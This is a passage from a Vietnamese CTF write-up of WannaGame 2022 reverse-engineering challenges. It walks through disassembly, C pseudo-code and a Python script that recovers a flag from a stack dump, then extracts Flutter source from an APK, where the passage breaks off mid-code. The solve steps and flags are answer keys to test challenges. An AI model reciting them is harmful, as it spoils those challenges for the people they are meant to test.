<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     edx, <span class="number">42</span>h ; <span class="string">&#x27;B&#x27;</span>  ; n</span><br><span class="line">mov     esi, <span class="number">0</span>          ; c</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _memset</span><br><span class="line">lea     rax, [rbp+var_50]</span><br><span class="line">mov     edx, <span class="number">42</span>h ; <span class="string">&#x27;B&#x27;</span>  ; n</span><br><span class="line">mov     esi, <span class="number">0</span>          ; c</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _memset</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x42</span>);</span><br><span class="line"><span class="built_in">memset</span>(var_50, <span class="number">0</span>, <span class="number">0x42</span>);</span><br><span class="line"><span class="comment">// Reset giá trị phần tử của s và var_50 về 0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     edi, <span class="number">0</span>          ; timer</span><br><span class="line">call    _time</span><br><span class="line">mov     edi, eax        ; seed</span><br><span class="line">call    _srand</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">srand(time(<span class="number">0</span>)); <span class="comment">// Khởi tạo random seed</span></span><br></pre></td></tr></table></figure>

<h3 id="Lap-va-re-nhanh"><a href="#Lap-va-re-nhanh" class="headerlink" title="Lặp và rẽ nhánh"></a>Lặp và rẽ nhánh</h3><ul>
<li>Vòng lặp thứ nhất</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    mov     [rbp+var_BC], <span class="number">0</span></span><br><span class="line">    jmp     <span class="keyword">short</span> loc_1657</span><br><span class="line">; ------</span><br><span class="line">loc_163A:                               ; CODE XREF: main+F7↓j</span><br><span class="line">                call    _rand</span><br><span class="line">                mov     edx, eax</span><br><span class="line">                mov     eax, [rbp+var_BC]</span><br><span class="line">                cdqe</span><br><span class="line">                mov     [rbp+rax+s], dl</span><br><span class="line">                add     [rbp+var_BC], <span class="number">1</span></span><br><span class="line">loc_1657:                               ; CODE XREF: main+D1↑j</span><br><span class="line">                cmp     [rbp+var_BC], <span class="number">41</span>h ; <span class="string">&#x27;A&#x27;</span></span><br><span class="line">                jle     <span class="keyword">short</span> loc_163A</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Tương đương với</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (var_BC = <span class="number">0</span>; var_BC &lt;= <span class="number">0x41</span>; var_BC++) &#123;</span><br><span class="line">    s[var_BC] = dl = (<span class="keyword">char</span>)edx = (<span class="keyword">char</span>)eax = (<span class="keyword">char</span>)rand();</span><br><span class="line">&#125; <span class="comment">// Khởi tạo s bằng các giá trị random</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Vòng lặp thứ 2</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">                mov     [rbp+var_B8], <span class="number">0</span></span><br><span class="line">                jmp     <span class="keyword">short</span> loc_16BD</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">loc_166C:                               ; CODE XREF: main+<span class="number">15</span>D↓j</span><br><span class="line">                mov     eax, [rbp+var_B8]</span><br><span class="line">                movsxd  rdx, eax</span><br><span class="line">                mov     rax, [rbp+ptr]</span><br><span class="line">                add     rax, rdx</span><br><span class="line">                movzx   edx, byte ptr [rax]</span><br><span class="line">                mov     eax, [rbp+var_B8]</span><br><span class="line">                cdqe</span><br><span class="line">                movzx   eax, [rbp+rax+s]</span><br><span class="line">                <span class="keyword">xor</span>     eax, edx</span><br><span class="line">                mov     edx, eax</span><br><span class="line">                mov     eax, [rbp+var_B8]</span><br><span class="line">                cdqe</span><br><span class="line">                movzx   eax, [rbp+rax+s]</span><br><span class="line">                add     eax, edx</span><br><span class="line">                mov     edx, eax</span><br><span class="line">                mov     eax, [rbp+var_B8]</span><br><span class="line">                cdqe</span><br><span class="line">                mov     [rbp+rax+var_50], dl</span><br><span class="line">                add     [rbp+var_B8], <span class="number">1</span></span><br><span class="line"></span><br><span class="line">loc_16BD:                               ; CODE XREF: main+<span class="number">103</span>↑j</span><br><span class="line">                cmp     [rbp+var_B8], <span class="number">41</span>h ; <span class="string">&#x27;A&#x27;</span></span><br><span class="line">                jle     <span class="keyword">short</span> loc_166C</span><br></pre></td></tr></table></figure>
<p>Tương đương với</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (var_B8 = <span class="number">0</span>; var_B8 &lt;= <span class="number">0x41</span>; var_B8++) &#123;</span><br><span class="line">    edx = ptr[var_B8]; <span class="comment">// = *(ptr + var_B8)</span></span><br><span class="line">    eax = s[var_B8]; <span class="comment">// rax = var_B8, eax = *(s+rax)</span></span><br><span class="line"></span><br><span class="line">    eax ^= edx; <span class="comment">// xor eax, edx</span></span><br><span class="line">    edx = eax;</span><br><span class="line">    eax = s[var_B8]; <span class="comment">// rax = var_B8, eax = *(s+rax)</span></span><br><span class="line">    eax += edx; <span class="comment">// add eax, edx</span></span><br><span class="line">    edx = eax;</span><br><span class="line"></span><br><span class="line">    var_50[var_B8] = (<span class="keyword">char</span>)edx; <span class="comment">// eax = var_B8, *(rax + var_50) = dl = (char)edx;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Vòng lặp thứ 3</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">                mov     [rbp+var_B4], <span class="number">0</span></span><br><span class="line">                jmp     <span class="keyword">short</span> loc_16FF</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">loc_16D2:                               ; CODE XREF: main+<span class="number">19F</span>↓j</span><br><span class="line">                mov     eax, [rbp+var_B4]</span><br><span class="line">                cdqe</span><br><span class="line">                movzx   eax, [rbp+rax+var_50]</span><br><span class="line">                movsx   eax, al</span><br><span class="line">                movzx   eax, al</span><br><span class="line">                mov     esi, eax</span><br><span class="line">                lea     rdi, format     ; <span class="string">&quot;%02X &quot;</span></span><br><span class="line">                mov     eax, <span class="number">0</span></span><br><span class="line">                call    _printf</span><br><span class="line">                add     [rbp+var_B4], <span class="number">1</span></span><br><span class="line"></span><br><span class="line">loc_16FF:                               ; CODE XREF: main+<span class="number">169</span>↑j</span><br><span class="line">                cmp     [rbp+var_B4], <span class="number">2</span></span><br><span class="line">                jle     <span class="keyword">short</span> loc_16D2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Tương đương với</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (var_B4 = <span class="number">0</span>; var_B4 &lt;= <span class="number">2</span>; var_B4++) &#123;</span><br><span class="line">    eax = var_50[var_B4]; <span class="comment">// eax = *(var_50 + var_B4)</span></span><br><span class="line">    eax = (<span class="keyword">char</span>)eax; <span class="comment">// = al;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, eax); <span class="comment">// edi = eax;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Sau đó chương trình thực hiện lệnh call tới hàm <code>sus</code> và kết thúc chương trình:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">                mov     edi, <span class="number">0</span>Ah        ; c</span><br><span class="line">                call    _putchar</span><br><span class="line">                mov     eax, <span class="number">0</span></span><br><span class="line">                call    sus</span><br><span class="line">                mov     eax, <span class="number">0</span></span><br><span class="line">                mov     rcx, [rbp+var_8]</span><br><span class="line">                <span class="keyword">xor</span>     rcx, fs:<span class="number">28</span>h</span><br><span class="line">                jz      <span class="keyword">short</span> locret_1735</span><br><span class="line">                call    ___stack_chk_fail</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">locret_1735:                            ; CODE XREF: main+<span class="number">1</span>C7↑j</span><br><span class="line">                leave</span><br><span class="line">                retn</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Tổng quan lại những gì chương trình đã làm trong hàm main:</p>
<ul>
<li>Tạo ptr từ file “.&#x2F;somethingSecret.txt”</li>
<li>Tạo mảng s random</li>
<li>Tạo mảng var_50 &#x3D; (ptr ^ s) + s (element wise)</li>
<li>Leak 3 phần tử đầu của mảng var_50 dưới dạng thập lục phân ra màn hình.</li>
</ul>
<h3 id="Ham-sus"><a href="#Ham-sus" class="headerlink" title="Hàm sus"></a>Hàm sus</h3><p>Quá trình tạo pseudo-code cũng tương tự như trên (hoặc có thể đọc trực tiếp không cần thông dịch) :&gt; Do hàm này sử dụng lại từ challenge trước, mình sẽ chỉ nói đại ý về công dụng thôi <img src="/images/Popo/2.webp" width="32" height="32" style="display:inline"></p>
<ul>
<li>Đọc <code>file</code> &#x2F;proc&#x2F;self&#x2F;maps, đây chính là bảng chứa virtual address của process hiện tại. Sau đó đọc qua từng dòng, đến khi nào dòng có substring là ‘[st’ (chính là [stack]) thì thực hiện parse địa chỉ đầu và cuối của stack</li>
<li>Mở <code>file</code> &#x2F;proc&#x2F;self&#x2F;mem, đây là memory hiện tại của chương trình, sau đó seek tới stack và dump toàn bộ ra file <code>dump</code></li>
</ul>
<h3 id="Huong-giai-quyet"><a href="#Huong-giai-quyet" class="headerlink" title="Hướng giải quyết"></a>Hướng giải quyết</h3><p>Như vậy, ta đã biết được các thông tin sau:</p>
<ul>
<li>stack của chương trình</li>
<li>Mảng var_50 thông qua những bytes đã được leak trong <code>log.txt</code> </li>
<li>Mảng s thông qua offset với mảng var_50</li>
<li>Không biết được thông tin của ptr trên heap (thông tin cần tìm)</li>
</ul>
<p>Như vậy, <code>ptr</code> có thể decode lại như sau:</p>
<p>var_50 &#x3D; (ptr ^ s) + s</p>
<p>Suy ra ptr &#x3D; (((var_50 - s) + 256) % 256) ^ s</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">leak = <span class="string">b&#x27;\xAE\x88\x89&#x27;</span></span><br><span class="line">offset_s = -<span class="number">0x50</span></span><br><span class="line">flag_size = <span class="number">0x42</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;dump&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">dump = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">var_50_pos = dump.find(leak)</span><br><span class="line">s_pos = var_50_pos + offset_s</span><br><span class="line"></span><br><span class="line">var_50 = dump[var_50_pos: var_50_pos + flag_size]</span><br><span class="line">s = dump[s_pos: s_pos + flag_size]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Recover</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(((a-b+<span class="number">256</span>)%<span class="number">256</span>)^b) <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(var_50, s)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result) <span class="comment"># Nhung_biet_ly_keo_dai_day_dut_moi_chinh_la_bua_tiec_cua_thanh_xuan</span></span><br></pre></td></tr></table></figure>

<p>Những flag của phần RE sau đó sẽ đem gửi lên server lấy format gốc (W1{.*}) -&gt; done</p>
<h2 id="2-Baby-APK"><a href="#2-Baby-APK" class="headerlink" title="2. Baby APK"></a>2. Baby APK</h2><p><img src="/images/wannagame-2022_2022-12-13-20-56-29.png"></p>
<h3 id="Danh-sach-cac-file-1"><a href="#Danh-sach-cac-file-1" class="headerlink" title="Danh sách các file:"></a>Danh sách các file:</h3><ul>
<li><a href="/data/wannagame-2022/babyapk/app.apk">app.apk</a></li>
</ul>
<h3 id="Tong-quan-1"><a href="#Tong-quan-1" class="headerlink" title="Tổng quan:"></a>Tổng quan:</h3><p>Đây là bài mình giải thứ 2, khi giải xong cũng khá bất ngờ khi mà lúc nộp server lại import thiếu flag, tốn hơn nửa tiếng để xác nhận phía tác giả + fix <img src="/images/Popo/1.webp" width="32" height="32" style="display:inline"></p>
<h3 id="Decompile-voi-jadx"><a href="#Decompile-voi-jadx" class="headerlink" title="Decompile với jadx"></a>Decompile với jadx</h3><p><img src="/images/wannagame-2022_2022-12-13-23-43-06.png"></p>
<p>Có thể thấy được chương trình hiện tại được build trên flutter. Ở flutter có 1 cái đặc biệt là <code>debug mode</code> và <code>release mode</code> sẽ hoàn toàn khác nhau, nguyên nhân là <code>debug mode</code> cần đến việc <code>hot reload</code> (cập nhật giao diện khi sửa code) bù lại cho việc app sẽ chạy chậm &amp; unstable hơn.</p>
<p>Để phân biệt giữa 2 mode, Ta chỉ cần xét đơn giản như sau</p>
<ul>
<li>Debug mode (bài hiện tại): Tồn tại file (<code>kernel_blob.bin</code>)[<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/53368586/what-is-flutters-kernel-blob-bin]">https://stackoverflow.com/questions/53368586/what-is-flutters-kernel-blob-bin]</a> trong folder assets&#x2F;flutter_assets&#x2F; , và đây cũng là file chứa mã nguồn chính của chương trình để phân tích</li>
<li>Release mode (bài <code>APK Again</code>): Tồn tại file <code>libapp.so</code> trong folder lib&#x2F;&lt; arch &gt;, chứa mã nguồn đã được compile lại thành VM Snapshot.</li>
</ul>
<h3 id="Phan-tich-kernel-blob-bin"><a href="#Phan-tich-kernel-blob-bin" class="headerlink" title="Phân tích kernel_blob.bin"></a>Phân tích kernel_blob.bin</h3><p>Đầu tiên, extract string có trong file sang file text, ví dụ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings kernel_blob.bin &gt; abc.txt</span><br></pre></td></tr></table></figure>

<p>Sau đó vào file, search với những cụm từ như <code>main.dart</code>, <code>wannagame_championship</code>(do đây cũng là package của app) để tìm vị trí của chương trình, tách lấy đoạn code cần thiết, ta được thành phẩm như sau:</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;dart:math&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:cryptography/cryptography.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:flutter/material.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:http/http.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">void</span> main() </span><br><span class="line">&#123;</span><br><span class="line">  runApp(<span class="keyword">const</span> MyApp());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; ra() </span><br><span class="line">&#123;</span><br><span class="line">  Random rand = Random(<span class="number">1412</span>);</span><br><span class="line">  <span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; arr = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="built_in">int</span> i =<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      arr.add(rand.nextInt(<span class="number">256</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; rb()</span><br><span class="line">&#123;</span><br><span class="line">  Random rand = Random(<span class="number">0xdeadbeef</span>);</span><br><span class="line">  <span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; arr = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="built_in">int</span> i =<span class="number">0</span>;i&lt;<span class="number">12</span>;i++)</span><br><span class="line">    arr.add(rand.nextInt(<span class="number">256</span>));</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">bool</span> cta(<span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; arr1,<span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt;arr2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i =<span class="number">0</span>;i&lt;arr1.length;i++)</span><br><span class="line">    <span class="keyword">if</span>(arr1[i]!=arr2[i])</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; m() </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">final</span> message = &lt;<span class="built_in">int</span>&gt;[<span class="number">13</span>, <span class="number">5</span>, <span class="number">172</span>, <span class="number">72</span>, <span class="number">129</span>, <span class="number">236</span>, <span class="number">106</span>, <span class="number">81</span>, <span class="number">95</span>, <span class="number">82</span>, <span class="number">154</span>, <span class="number">188</span>, <span class="number">102</span>, <span class="number">63</span>, <span class="number">210</span>, <span class="number">150</span>, <span class="number">80</span>, <span class="number">56</span>, <span class="number">108</span>, <span class="number">22</span>, <span class="number">100</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="built_in">int</span> i =<span class="number">0</span>;i&lt;message.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      message[i]=message[i]^<span class="number">0xab</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> message;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; k()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> ra();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; n()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> rb();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">List</span> &lt;<span class="built_in">int</span>&gt; ma()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">final</span> mac = &lt;<span class="built_in">int</span>&gt;[<span class="number">162</span>, <span class="number">93</span>, <span class="number">181</span>, <span class="number">147</span>, <span class="number">1</span>, <span class="number">86</span>, <span class="number">102</span>, <span class="number">148</span>, <span class="number">137</span>, <span class="number">92</span>, <span class="number">119</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">91</span>, <span class="number">23</span>, <span class="number">226</span>, <span class="number">251</span>, <span class="number">40</span>, <span class="number">192</span>, <span class="number">189</span>, <span class="number">204</span>, <span class="number">190</span>, <span class="number">40</span>, <span class="number">167</span>, <span class="number">4</span>, <span class="number">227</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">170</span>, <span class="number">136</span>, <span class="number">100</span>, <span class="number">53</span>];</span><br><span class="line">  <span class="keyword">return</span> mac;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Future&lt;<span class="built_in">String</span>&gt; calc_chacha20(<span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; m,<span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; k,<span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; n,<span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; ma) <span class="keyword">async</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">final</span> algorithm = Chacha20(</span><br><span class="line">    macAlgorithm: Hmac.sha256(),</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">final</span> secretKey = <span class="keyword">await</span> algorithm.newSecretKeyFromBytes(k);</span><br><span class="line">  SecretBox secretBox = SecretBox(m,nonce: n,mac:Mac(ma));</span><br><span class="line">  <span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; clearText = <span class="keyword">await</span> algorithm.decrypt(</span><br><span class="line">      secretBox,</span><br><span class="line">      secretKey: secretKey</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCodes(clearText);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">bool</span> cts(<span class="built_in">String</span> str1,<span class="built_in">String</span> str2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> str1==str2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Future&lt;<span class="built_in">bool</span>&gt; ch(<span class="built_in">String</span> p) <span class="keyword">async</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">String</span> dp = <span class="keyword">await</span> calc_chacha20(m(),k(),n(),ma());</span><br><span class="line">  <span class="keyword">if</span> (cts(dp,p))</span><br><span class="line">    <span class="keyword">return</span> Future.value(<span class="keyword">true</span>);</span><br><span class="line">  <span class="keyword">return</span> Future.value(<span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyApp</span> <span class="keyword">extends</span> <span class="title">StatelessWidget</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> MyApp(&#123;Key? key&#125;) : <span class="keyword">super</span>(key: key);</span><br><span class="line">  <span class="comment">// This widget is the root of your application.</span></span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  Widget 